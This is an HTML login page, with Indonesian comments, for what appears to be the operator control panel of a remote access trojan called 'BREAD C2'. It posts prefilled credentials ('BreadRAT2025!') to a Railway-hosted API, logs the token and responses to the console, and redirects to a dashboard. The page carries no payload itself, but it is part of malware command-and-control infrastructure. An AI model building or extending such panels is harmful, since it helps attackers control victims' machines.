<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BREAD C2 - Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="login-card">
        <h3>🍞 BREAD C2</h3>
        <p class="text-muted">Login to Control Panel</p>
        <form id="loginForm" method="POST" action="#">
            <div class="mb-3">
                <label class="form-label">Username</label>
                <input type="text" class="form-control" id="username" value="admin" required>
            </div>
            <div class="mb-3">
                <label class="form-label">Password</label>
                <input type="password" class="form-control" id="password" value="BreadRAT2025!" required>
            </div>
            <button type="submit" class="btn btn-primary w-100">Login</button>
        </form>
        <div id="errorMsg" class="text-danger mt-2"></div>
    </div>
    <script>
        // 🔥 GANTI DENGAN URL RAILWAY-MU
        const API_BASE = 'https://project-production-82c9.up.railway.app';

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) {
                document.getElementById('errorMsg').innerText = 'Username dan password wajib diisi';
                return;
            }

            try {
                console.log('🔹 Sending login request to:', API_BASE + '/api/auth/login');
                const res = await fetch(API_BASE + '/api/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });

                console.log('🔹 Response status:', res.status);
                console.log('🔹 Response headers:', res.headers);

                // Clone response agar bisa dibaca dua kali (untuk debug)
                const cloneRes = res.clone();
                const text = await cloneRes.text();
                console.log('🔹 Raw response body:', text);

                let data;
                try {
                    data = JSON.parse(text);
                } catch (parseError) {
                    console.error('❌ Failed to parse JSON:', parseError);
                    document.getElementById('errorMsg').innerText = 'Server returned invalid JSON. Check console.';
                    return;
                }

                console.log('🔹 Parsed data:', data);

                if (res.ok && data.token) {
                    console.log('✅ Login success, token:', data.token);
                    localStorage.setItem('token', data.token);
                    localStorage.setItem('api_base', API_BASE);
                    console.log('🔹 Redirecting to dashboard.html...');
                    // Redirect setelah 500ms untuk memastikan storage sudah tersimpan
                    setTimeout(() => {
                        window.location.href = 'dashboard.html';
                    }, 500);
                } else {
                    console.log('❌ Login failed. res.ok:', res.ok, 'data.token:', data.token);
                    document.getElementById('errorMsg').innerText = data.error || 'Login failed (check console)';
                }
            } catch (err) {
                console.error('🔥 Fetch error:', err);
                document.getElementById('errorMsg').innerText = 'Network error: ' + err.message;
            }
        });

        // Tambahan: jika sudah login sebelumnya, langsung redirect
        (function() {
            const token = localStorage.getItem('token');
            if (token) {
                console.log('🔹 Token ditemukan di localStorage, redirect ke dashboard');
                window.location.href = 'dashboard.html';
            }
        })();
    </script>
</body>
</html>
